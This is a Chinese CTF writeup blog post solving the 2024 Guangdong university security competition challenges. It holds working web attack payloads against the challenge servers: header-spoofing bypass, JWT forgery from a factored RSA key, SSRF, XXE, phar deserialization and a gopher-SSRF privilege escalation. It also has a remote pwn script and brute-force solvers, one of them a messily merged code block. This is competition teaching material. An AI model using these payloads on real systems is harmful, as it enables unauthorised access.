---
title: 2024 第三届广东大学生网络安全攻防竞赛 全部题解
tags: Writeup
categories: Writeup
date: 2024-05-12 22:00:00
toc: true
---

呢篇文章系热心网友投稿㗎，S1uM4i帮手发咗

<!--more-->

**著名五星上将麦克阿瑟这样评价：如果当年面对的不是战场而是广东省赛的赛场，我不敢保证我有上赛场的勇气。**

QA：比赛整体感受？

[如何评价第三届广南大学生网络安全攻防竞赛? - 知乎](https://www.zhihu.com/question/655543283)

[如何评价第三届广东大学生网络安全攻防竞赛? - 知乎](https://www.zhihu.com/question/655489131)

QA：以人类现有的技术，是否有能力实现一个开赛不会崩溃，已解出题目不会渲染错误，查看队伍信息不会一不小心刷出别队数据的平台？

答： https://github.com/GZTimeWalker/GZCTF

当然，您也可以使用 https://github.com/CTFd/CTFd ，不过不加插件的情况下并发不一定能得到保证

另外，以上平台全部免费使用，多出来的预算可以用来发奖金或者犒劳平台作者

## Web

### 消失的flag（猜谜语）

Access Denied 用 X-Forwarded-For 伪造成 127.0.0.1 进行绕过

之后 `?file=php://filter/resource=/flag`

这个 file 的传参什么都没说，要自己测，应该是要求以 `php://` 开头，而且限制了长度

![img](../images/2024-ProvinceCTF/image1.webp)

### Hackme（套娃缝合怪）

扫目录能看到 composer.json 得知是 php-jwt

两个用户 admin/123456 test/123456 都可以登陆，分别拿到两段 jwt token

Jwt  加密形式是 RS256 

参考 https://ctftime.org/writeup/30541   

```Bash
docker run -it sig2n /bin/bash
root@201317bd1ea9:/app python3 jwt_forgery.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJpcCI6IjE3Mi4yMC4yNDAuMzIifQ.DDtMChPMQtBA_2_wJxLPO_6g5dTaM7stY2Knngol6qAeaWh4Y8EjY6ndBLuEMhXYyecpiLFXZxEPqkV_GW3rGReg7LTCfIb4x6M6RRhotbersK1AGKKGUyVHmr0es0bHpw eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoidGVzdCIsImlwIjoiMTcyLjIwLjI0MC4zMiJ9.A9CrtyzLavHQif9VRIHJN1kSjLefzcKPArv3Eo96EbSlD5gzRU78QGiFkdtW_YxQgYc7z82PqH1BQGWMf5CLBfYSQNB6V9HV7FyZJUpzZt2b-irXitYFhW2qQJr0i_yrJA
```

![img](../images/2024-ProvinceCTF/image2.webp)

得到4个公钥文件

搭建php-jwt环境测试公钥 `108b7c75aee1e2b9_65537_x509.pem` 可以解析成功

```PHP
<?php

require __DIR__ . '/../vendor/autoload.php';

use Firebase\JWT\JWT;
use Firebase\JWT\Key;

$publicKey = <<<EOD
-----BEGIN PUBLIC KEY-----
MHwwDQYJKoZIhvcNAQEBBQADawAwaAJhEIt8da7h4rnfNpKizFSxANERACGT68nD
z1deSxb1lcwo2bR6ZdHzd0qj2wVkkIVYkjD+I7/MLvh2tBNNr95EhNe96Mm4ABbZ
ya7VOgM0rjSDzIMzdDAeGngppfWACnk4AwIDAQAB
-----END PUBLIC KEY-----
EOD;

$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJpcCI6IjE3Mi4yMC4yNDAuMzIifQ.DDtMChPMQtBA_2_wJxLPO_6g5dTaM7stY2Knngol6qAeaWh4Y8EjY6ndBLuEMhXYyecpiLFXZxEPqkV_GW3rGReg7LTCfIb4x6M6RRhotbersK1AGKKGUyVHmr0es0bHpw";
$decoded = JWT::decode($jwt, new Key($publicKey, 'RS256'));

/*
 NOTE: This will now be an object instead of an associative array. To get
 an associative array, you will need to cast it as such:
*/

$decoded_array = (array) $decoded;
echo "Decode:\n" . print_r($decoded_array, true) . "\n";?>
```

当时没参考上面的链接，使用密码学分解n然后构造的私钥，n用factordb分解，一个两位数*一个大数，很好分解

python 构造私钥 out.pem

```Python
from Crypto.PublicKey import RSA
from Crypto.Util.number import *
p,q = 29, 885731264777006016949538174167421055106671825208071429372957080488056684683665488948487967838835515568939998600930981430522968381790106454299700877730028009484658871805488338066181488784346146102820600567382567659499055669858852511
n = p * q
e = 0x10001
d = inverse(e,(p - 1) * (q - 1))
pub = RSA.construct((n,e,d,p,q))
with open('out.pem','wb') as f:
    f.write(pub.exportKey('PEM'))
with open('out.pem','rb') as f:
    print(f.read().decode())
```

使用 php-jwt 修改 `payload["ip"]`

```PHP
<?php

require __DIR__ . '/../vendor/autoload.php';

use Firebase\JWT\JWT;
use Firebase\JWT\Key;


$privateKey = <<<EOD
-----BEGIN RSA PRIVATE KEY-----
MIIBnAIBAAJhEIt8da7h4rnfNpKizFSxANERACGT68nDz1deSxb1lcwo2bR6ZdHz
d0qj2wVkkIVYkjD+I7/MLvh2tBNNr95EhNe96Mm4ABbZya7VOgM0rjSDzIMzdDAe
GngppfWACnk4AwIDAQABAmEKpfUIG6wBMAOtnv0vdki0XiDfW6KTMDRDvdcjryUd
sIi8WaAV8ZW9z9XWw/v8U/4DrOzW5nJwm2BwMRfpIfKlS/QW0gX/TR+btntJc6P8
wnks0vynK8S9A+l4kegxYrSxAgEdAmEAkg0einG4Xq9r0BdE1shPeffCNh+VXzu3
s5B+LO38Vnz+rfKQwJ5230Nxe8WstSZdUSM/Bp0cGjkPCX5D24bGyaVx9Uz3LO0G
9F+g5aC2jw1fU/jyWe9iBCS/Gh7l4N6fAgEFAmBhCOJfrQqHrhj9WlhcMx3KtTeN
ahJ+AVkdrkSGaV+bvtQekehmcWIdF9wQFdeXS3P4cmhvZnbDXWGGNyOyeKseUhOS
nJ4kdR6HwflOVyaziHjre5zY79i5VAi7vAeTDZUCAQc=
-----END RSA PRIVATE KEY-----
EOD;

$payload = [
    'user' => 'admin',
    'ip' => '127.0.0.1'
];

$jwt = JWT::encode($payload, $privateKey, 'RS256');
echo "Encode:\n" . print_r($jwt, true) . "\n";
// Encode:
// eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJpcCI6IjEyNy4wLjAuMSJ9.AJ7tY-z-tLbdvx429JSBlagzQnz_Dv5h6iCqWDkZFBgh4pZo7z-BoQ7_vC5Bxg0f80GWh0xtv_UtTtkyDhJ9LgqYX41CGlMvi3HtcI15MPIrdebGwogYb-uAU7FU6GrZKA
```

校验成功

![img](../images/2024-ProvinceCTF/image3.webp)

第二层有个文件上传接口，一个getfile.php的文件下载接口

测试了一下发现存在ssrf，检测了内容 禁止了127.0.0.1（测试发现应该还会强制加上http://协议头），检测了oss.jxsec.cn字符

无法访问上传的文件，猜测oss和题目是一台服务器，访问本地的8000端口

![img](../images/2024-ProvinceCTF/image4.webp)

xml数据错误，文件路径正确会显示download error => xxe，xxe禁止了system字符 => iconv编码绕过

![img](../images/2024-ProvinceCTF/image5.webp)

![img](../images/2024-ProvinceCTF/image6.webp)

### unserialize_web（原题）

www.tar.gz 下载到源码 

**发现原来是抄了NSS的题** **https://blog.csdn.net/m0_68113265/article/details/132407965**

唯一区别是需要猜到 www.tar.gz（需要简单扫描你就说呗，不放 www.zip 又想考就大胆点让扫嘛）

还有签名方法换成了 sha256，其他的完全一致，用原题 payload 打就行了

需要对序列化的值进行修改来绕过 __wakeup，之后要对 phar 重新签名

upload.php 上传文件 phar 格式的 gzip 压缩文件

download.php 传入 phar://... 

触发反序列化读取 /flag 内容

### MyPDF（原题）

www.zip 下载到源码

**您猜怎么着，又是抄了21年的****原题** **https://r0.haxors.org/posts?id=15**

注册的邀请码绕过 

```JSON
{"action":"register","d":{"user":"llllllll","pass":"llllllll","invite":-1e122222222222}}
```

题目环境不出网，但是题目中对 tcpdf 的代码做了一点小修改，让其可以直接打 gopher ssrf

![img](../images/2024-ProvinceCTF/image7.webp)

payload

```JSON
{
    "action":"new",
    "d":{
        "title":"<linktype=\"text/css\"href=\"gopher://localhost:8082/_POST%20%2Fusers%20HTTP%2F1%2E1%0AHost%3A%20localhost%0AContent%2DLength%3A%2019%0AContent%2Dtype%3A%20application%2Fjson%0A%0A%7B%22user%22%3A%22llllllll%22%7D\">",
        "content":"1234"
     }
}
```

将自己当前用户设置成 admin 权限，最后直接拿 flag

## PWN

### pwn_server

程序启动了10888端口的服务，逆向发现自己实现的strlen有漏洞，当传入的字符串第一个字符是\x00时候会返回-1(uint8)，使得下方拷贝长度变成255，导致栈上msg正好被替换成flag。

**出题人替我们布局好栈等着pwn可真是有意义呢，XOR 48也真是必要呢**

```Python
from pwn import *

p = remote("xxxx.tq.jxsec.cn", 114514)
p.sendline(b"0:0")
p.interactive()
```

## Reverse

### re1（无法验证flag正确性）

![img](../images/2024-ProvinceCTF/image8.webp)

脑洞，main往上有一段deadcode是xxtea，delta改0xA4EE8C0其他不变 (可能因为n=2时y和z刚好重复了)

不知道是不是出题人不知道C语言的宏是什么，很多操作放到了函数里

https://blog.csdn.net/weixin_45582916/article/details/121425780 

```C
int main(){
        uint32_t v[] = { 0xb7033832,0x39d8def0, 0};
        uint32_t k[] = { 0xb0011020,0x60508030,0x23088177,0x4e22f60b,0x0000000f};
        btea2((uint32_t*)v, -2, (uint32_t*)k);
        printf("%s\n", v);
}
```

### re2（无法验证flag正确性）

第一个for输入5个bytes，每个byte在输入int的偏移分别是 8 16 24 0 8。

即第一个输入(X<<8)，得X；第二个输入(X<<16)，得X，随后查双射替换表得到替换后的5bytes

要求5个bytes按输入顺序计算crc32等于0x27949C6C。根据移位性质，可以从后向前确定最高byte，次高byte，直到第一轮输入无法确定产生全部256种可能。

这里可以用 https://github.com/theonlypwner/crc32 简单修改一下五字节的输出，1秒爆出全部的。

第二个for输入5个小于16的数字作为数组下标，将第一轮映射后的输入数据按第二轮输入数据放入硬编码数组

`byte_434AD8` ，该数组是最后密钥。使用暴力枚举全部的16选5种排列可能，也可以1秒解出。

因为第二轮长度有16，所以合法解概率上是接近唯一的。

```C
static unsigned int crc32(const unsigned char* buf) {
    unsigned int i, crc = 0xFFFFFFFF;
    for (i = 0; i < 16; i++) // crc32tab 为CRC32标准公开表
        crc = crc32tab[(crc ^ buf[i]) & 0xff] ^ (crc >> 8);
    return crc ^ 0xFFFFFFFF;
}
ty 为第一轮的全部256种可能
int main() {
    for (int ty_index = 0; ty_index < 1265; ty_index += 5) {
        for (int i = 0; i < 16; i++) 
            for (int j = 0; j < 16; j++) {
                if (j == i)continue;
                for (int k = 0; k < 16; k++) 
                    for (int l = 0; l < 16; l++) 
                        for (int m = 0; m < 16; m++) {
                            unsigned char cur[16];
                            memcpy(cur, byte_434AD8, 16);
                            cur[i] = ty[ty_index];
                            cur[j] = ty[ty_index + 1];
                            cur[k] = ty[ty_index + 2];
                            cur[l] = ty[ty_index + 3];
                            cur[m] = ty[ty_index + 4];
                            if (crc32(cur) == (unsigned int)0x7F5E79B7) {
                                // printf("%d %d %d %d %d\n", i, j, k, l, m);
                                // printf("%d %d %d %d %d\n", ty[ty_index], ty[ty_index + 1], ty[ty_index + 2], ty[ty_index + 3], ty[ty_index + 4]);
                                for (int x = 0; x < 16; x++) {
                                    printf("%d, ", cur[x]);  // 即为最终密钥
}}}}}}
```

最终AES-ECB用得到的**密钥（不会输出）**解密得flag

![题目极高的英语水平](../images/2024-ProvinceCTF/image9.webp)

另一种爆破脚本：

```C++
Python#include<stdio.h>
#include <string.h>
#include <stdlib.h>
#include"defs.h"

unsigned char byte_150DE0[256] = {
    0x57, 0x62, 0x35, 0xEF, 0x79, 0x3A, 0xC7, 0x9A, 0x8F, 0x2A, 0x13, 0x42, 0x51, 0xAF, 0x38, 0x4B, 
    0xC1, 0xB2, 0x3E, 0x09, 0x54, 0x2B, 0xAE, 0xE9, 0xE0, 0x7A, 0xDB, 0x55, 0x5C, 0x8C, 0xB7, 0xD2, 
    0xC6, 0x45, 0xB8, 0x1B, 0xB9, 0x22, 0xDF, 0x15, 0x23, 0x31, 0x68, 0x1F, 0xCA, 0x2F, 0x04, 0x76, 
    0x7F, 0x6B, 0x82, 0x60, 0xD5, 0x6D, 0xCE, 0x87, 0x4E, 0x21, 0x58, 0xF8, 0xCC, 0x9B, 0x0E, 0xA0, 
    0xDC, 0xC2, 0x26, 0x84, 0x24, 0xCF, 0xA4, 0xA6, 0xA9, 0xC5, 0xD3, 0x2C, 0x34, 0xA5, 0x0C, 0x5D, 
    0x02, 0x6A, 0xAA, 0x5A, 0xE2, 0x3C, 0xC3, 0x17, 0x7B, 0x19, 0xCB, 0xE6, 0xB4, 0x16, 0x43, 0x2E, 
    0x74, 0x08, 0x25, 0x99, 0x8B, 0xF9, 0x06, 0x8D, 0xFC, 0x5F, 0x86, 0x8A, 0x7C, 0xD9, 0x3D, 0xFE, 
    0xED, 0xEA, 0x61, 0x9F, 0xEB, 0xBE, 0xFA, 0xFD, 0xBB, 0x4F, 0xB6, 0x94, 0x29, 0xE1, 0x14, 0xAB, 
    0xD7, 0x89, 0x46, 0x92, 0x30, 0x0F, 0x41, 0xE4, 0x9E, 0x6C, 0xC0, 0xFB, 0xC9, 0xDD, 0xAD, 0x49, 
    0x03, 0xB3, 0x1E, 0x91, 0xDE, 0x90, 0xF4, 0x48, 0xD4, 0x4A, 0x6F, 0xE3, 0x64, 0x1D, 0xD8, 0xBF, 
    0xBA, 0xAC, 0x3F, 0xC4, 0x52, 0x20, 0x56, 0x12, 0x97, 0xEE, 0x2D, 0xBC, 0x07, 0xDA, 0xF5, 0x78, 
    0x85, 0x98, 0x0A, 0xCD, 0x0D, 0x6E, 0xA8, 0x28, 0x65, 0x5E, 0x88, 0xF1, 0x10, 0xE5, 0x9C, 0xA2, 
    0x47, 0x73, 0x0B, 0xF7, 0x75, 0xB0, 0x72, 0xC8, 0x39, 0x50, 0x7D, 0x80, 0x18, 0x70, 0x1A, 0xF6, 
    0x4C, 0x5B, 0xA3, 0xF0, 0xB5, 0x95, 0x59, 0xF2, 0x33, 0x66, 0x63, 0x9D, 0x69, 0xF3, 0x37, 0x77, 
    0x4D, 0x93, 0x53, 0x83, 0xD1, 0x71, 0x32, 0x05, 0x8E, 0x40, 0x1C, 0x36, 0x81, 0xB1, 0x96, 0xBD, 
    0x7E, 0x01, 0xD0, 0xD6, 0xE8, 0x44, 0xE7, 0x67, 0xA1, 0xEC, 0x3B, 0x27, 0x11, 0xA7, 0x00, 0x00
};

unsigned int dword_150EE0[258] = {
    0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3, 
    0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91, 
    0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7, 
    0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5, 
    0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B, 
    0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59, 
    0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F, 
    0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D, 
    0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433, 
    0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01, 
    0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457, 
    0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65, 
    0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB, 
    0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9, 
    0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F, 
    0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD, 
    0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683, 
    0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8, 0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1, 
    0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7, 
    0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5, 
    0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B, 
    0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79, 
    0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F, 
    0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D, 
    0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713, 
    0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21, 
    0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777, 
    0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45, 
    0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB, 
    0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9, 
    0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF, 
    0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D, 
    0x7F5E79B7, 0x00000000
};

unsigned char asc_154AD8_const[16] = {
    0x1B, 0xB1, 0xFF, 0xFD, 0x19, 0xFF, 0x89, 0x8C, 0x09, 0xFF, 0xFF, 0xD7, 0x4A, 0xB3, 0xFF, 0xEB
};

int rand2(char *v25) {
    char asc_154AD8[16];
    unsigned int v16, v18, v19, v21, v20; 
    for(int i0 = 0; i0 < 16; ++i0) {
        for(int i1 = 0; i1 < 16; ++i1) {
            for(int i2 = 0; i2 < 16; ++i2) {
                for(int i3 = 0; i3 < 16; ++i3) {
                    for(int i4 = 0; i4 < 16; ++i4) {
                        char v24[5] = {i0,i1,i2,i3,i4};
                        memcpy(asc_154AD8, asc_154AD8_const, 0x10); 
                        if ( v24[0] <= 0xFu )
                            asc_154AD8[v24[0]] = v25[0];
                        if ( v24[1] <= 0xFu )
                            asc_154AD8[v24[1]] = v25[1];
                        if ( v24[2] <= 0xFu )
                            asc_154AD8[v24[2]] = v25[2];
                        if ( v24[3] <= 0xFu )
                            asc_154AD8[v24[3]] = v25[3];
                        if ( v24[4] <= 0xFu )
                            asc_154AD8[v24[4]] = v25[4];
                        v16 = -1;
                        for ( int j = 0; j < 0x10; j += 4 )
                        {
                            v18 = dword_150EE0[(unsigned __int8)(v16 ^ asc_154AD8[j])] ^ (v16 >> 8);
                            v19 = dword_150EE0[(unsigned __int8)(v18 ^ asc_154AD8[j + 1])] ^ (v18 >> 8);
                            v20 = dword_150EE0[(unsigned __int8)(v19 ^ asc_154AD8[j + 2])] ^ (v19 >> 8);
                            v21 = asc_154AD8[j + 3];
                            v16 = dword_150EE0[(unsigned __int8)(v20 ^ v21)] ^ (v20 >> 8);
                        }
                        if(~v16 == 0x7F5E79B7) {
                            printf("[+] rand2 %d %d %d %d %d\n", i0, i1, i2, i3, i4);
                            return 1;
                        }
                    }
                    }
                    }
                    }
                    }

    return 0;
    
}

int main(int argc, char**argv) {
    printf("-----------------rand1----------\n");
    if(argc < 2) {
        printf("[-] usage brute start");
        exit(0);
    }
    int to = atoi(argv[1]);
    printf("[+] i0 begin in %d\n", to);
    for(int i0 = to; i0 < 256; ++i0) {
        for(int i1 = 0; i1 < 256; ++i1) {
            for(int i2 = 0; i2 < 256; ++i2) {
                for(int i3 = 0; i3 < 256; ++i3) {
                    for(int i4 = 0; i4 < 256; ++i4) {
                        char v25[5] = {byte_150DE0[i0], byte_150DE0[i1], byte_150DE0[i2], byte_150DE0[i3], byte_150DE0[i4]};
                        unsigned int v8, v9, v10, v5;
                        v8 = dword_150EE0[(unsigned __int8)(~LOBYTE(dword_150EE0[(unsigned __int8)~v25[0]]) ^ v25[1])] ^ ((dword_150EE0[(unsigned __int8)~v25[0]] ^ 0xFFFFFFu) >> 8);
                        v9 = dword_150EE0[(unsigned __int8)(v8 ^ v25[2])] ^ (v8 >> 8);
                        v10 = dword_150EE0[(unsigned __int8)(v9 ^ v25[3])] ^ (v9 >> 8);
                        v5 = ~(dword_150EE0[(unsigned __int8)(v10 ^ v25[4])] ^ (v10 >> 8));
                        if(v5 == 0x27949C6C) {
                            printf("[+] rand1 => %d %d %d %d %d\n", i0 * 0x100, i1 * 0x10000, i2 * 0x1000000, i3, i4 * 0x100);
                            if(rand2(v25)) goto success;
                        }
                    }
                }   
            }
        }
    }

    success:
    printf("success");
}
f = lambda x: f'''cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute {x}"\n'''
data = ""
for i in range(0, 256, 256//16):
    data += f(i)
with open("run.sh", "w") as f:
    f.write(data) 
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 0"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 16"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 32"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 48"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 64"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 80"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 96"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 112"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 128"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 144"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 160"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 176"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 192"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 208"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 224"
cmd.exe /c start "wt.exe" -w 0 nt -d . wsl.exe -d Ubuntu-22.04 bash -c "./brute 240"
```

![img](../images/2024-ProvinceCTF/image10.webp)

## Misc

### 猜一猜

**出题人大概是没怎么打过CTF**，不知道最外层附件文件名一般不会算在脑洞里。

文件名 205c8479398be4a4a5dc60611a15670e 是压缩包密码的md5，cmd5或者somd5查得明文 a1478520 。

解压压缩包得一损坏的 flag.png，对 flag.png 修出png头 89 50 4E 47 ，得一二维码图片。

扫描后使用花朵解密 https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo 得flag

### 你要的就在这

![img](../images/2024-ProvinceCTF/image11.webp)

![img](../images/2024-ProvinceCTF/image12.webp)

取前六位为密钥

https://github.com/izcoser/stegpy

PNG文件尾找到这个stegpy

```C++
stegpy xxx.png -p
```

密钥3.1415，可以获得

```C++
3557736c7371495153424738633644326d352f4b5277672b36676a6d3174723144513855794a556d495a733dk:luckyone
```

然后把对称算法都脑洞一遍（RC系列 AES系列 DES系列...）

![img](../images/2024-ProvinceCTF/image13.webp)

## Crypto

### Encipher（给出n e d c求m的RSA)

RSA 给定 N e d c 找个猴子或者ChatGPT来解出明文m

然后XOR给了密钥key，明文m异或回去就是flag

```Python
#coding=gbk
from Crypto.Util.number import *
from gmpy2 import *

d = 4885628697024674802233453512637565599092248491488767824821990279922756927662223348312748794983451796542248787267207054348962258716585568185354414099671493917947012747791554070655258925730967322717771647407982984792632771150018212620323323635510053326184087327891569331050475507897640403090397521797022070233
n= 89714050971394259600440975863751229102748301873549839432714703551498380713981264101533375672970154214062583012365073892089644031804109941766201243163398926438698369735588338279544152140859123834763870759757751944228350552806429642516747541162527058800402619575257179607422628877017180197777983487523142664487
c = 67254133265602132458415338912590207677514059205474875492945840960242620760650527587490927820914970400738307536068560894182603885331513473363314148815933001614692570010664750071300871546575845539616570277302220914885734071483970427419582877989670767595897758329863040523037547687185382294469780732905652150451
key  = b'Life is like an ocean only strong-minded can reach the other shore'

ans = pow(c,d,n)
key = key[:len(long_to_bytes(ans))]
ans = ans ^ bytes_to_long(key)
print(long_to_bytes(ans))
```